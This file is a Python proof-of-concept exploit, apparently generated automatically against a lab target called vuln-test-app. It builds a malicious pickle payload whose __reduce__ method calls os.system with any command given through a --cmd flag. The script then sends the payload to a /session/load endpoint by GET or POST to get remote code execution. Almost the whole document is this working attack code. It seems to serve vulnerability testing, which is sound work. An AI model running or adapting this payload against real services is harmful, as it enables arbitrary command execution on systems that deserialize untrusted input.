#!/usr/bin/env python3
# PoC for vuln-test-app (/tmp/vuln-test-app)
# Path: rce-002
# Sink: load_session
# Auto-generated — run with: python3 rce_since_pickle_load_session_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure deserialization in vuln-test-app.

Vulnerability: The `load_session` function in /tmp/vuln-test-app/app/server.py
              decodes a base64-encoded string and passes it directly to
              pickle.loads(). Since pickle.loads() can execute arbitrary code
              during deserialization, and the input is attacker-controlled via
              a public API, this leads to Remote Code Execution (RCE).

Usage:
    python3 exploit.py [--target http://localhost:8080] [--cmd "command"]

    By default, a benign payload is used: `touch /tmp/poc_success.txt`
    To run a custom command, use the --cmd flag.

Requirements:
    - Python 3.x (stdlib only, no external dependencies)
    - The target server must be running and accessible.
"""

import base64
import pickle
import subprocess
import sys
import argparse
import urllib.request
import urllib.error
import socket
import time

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8080"
DEFAULT_CMD = "touch /tmp/poc_success.txt"
TIMEOUT = 10  # seconds for HTTP requests

# ---------------------------------------------------------------------------
# Payload generation
# ---------------------------------------------------------------------------
def generate_pickle_payload(command: str) -> bytes:
    """
    Generate a malicious pickle payload that executes `command` via os.system.

    The payload uses __reduce__ to return a tuple (callable, args) where
    callable is os.system and args is (command,). When pickle.loads() is
    called, it will execute os.system(command).

    Args:
        command: The shell command to execute on the target.

    Returns:
        A bytes object containing the base64-encoded pickle payload.
    """
    class RCE:
        def __reduce__(self):
            import os
            return (os.system, (command,))

    # Pickle the object and base64-encode it
    pickled = pickle.dumps(RCE())
    return base64.b64encode(pickled)

# ---------------------------------------------------------------------------
# Exploit execution
# ---------------------------------------------------------------------------
def send_payload(target_url: str, payload: bytes) -> bool:
    """
    Send the malicious payload to the vulnerable endpoint.

    The endpoint is assumed to be at /session/load (or similar). Adjust the
    path if needed based on the actual API.

    Args:
        target_url: Base URL of the target (e.g., http://localhost:8080)
        payload: Base64-encoded pickle payload as bytes.

    Returns:
        True if the request succeeded (HTTP 2xx), False otherwise.
    """
    # Construct the full URL. The vulnerable function is likely exposed via
    # a route like /session/load?data=<base64> or POST with JSON.
    # We'll try a GET request with the payload as a query parameter.
    # If that fails, we'll try a POST with JSON body.
    import json

    # Attempt 1: GET with query parameter
    url = f"{target_url.rstrip('/')}/session/load?data={payload.decode()}"
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            print(f"[+] GET request succeeded (HTTP {resp.status})")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] GET failed with HTTP {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        print(f"[-] GET failed: {e.reason}")
    except socket.timeout:
        print("[-] GET timed out")

    # Attempt 2: POST with JSON body
    url = f"{target_url.rstrip('/')}/session/load"
    data = json.dumps({"session_data": payload.decode()}).encode()
    headers = {"Content-Type": "application/json"}
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            print(f"[+] POST request succeeded (HTTP {resp.status})")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] POST failed with HTTP {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        print(f"[-] POST failed: {e.reason}")
    except socket.timeout:
        print("[-] POST timed out")

    return False

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Exploit insecure deserialization in vuln-test-app"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--cmd",
        default=DEFAULT_CMD,
        help=f"Command to execute on the target (default: '{DEFAULT_CMD}')"
    )
    args = parser.parse_args()

    print("[*] Generating malicious pickle payload...")
    payload = generate_pickle_payload(args.cmd)
    print(f"[*] Payload (base64): {payload.decode()}")

    print(f"[*] Sending payload to {args.target}...")
    success = send_payload(args.target, payload)

    if success:
        print("[+] Exploit sent successfully!")
        print(f"[*] The command '{args.cmd}' should have been executed on the target.")
        print("[*] Check for evidence (e.g., /tmp/poc_success.txt if using default).")
    else:
        print("[-] Failed to send exploit. Check the target URL and endpoint path.")
        print("[-] You may need to adjust the endpoint path in the script.")
        sys.exit(1)

if __name__ == "__main__":
    main()
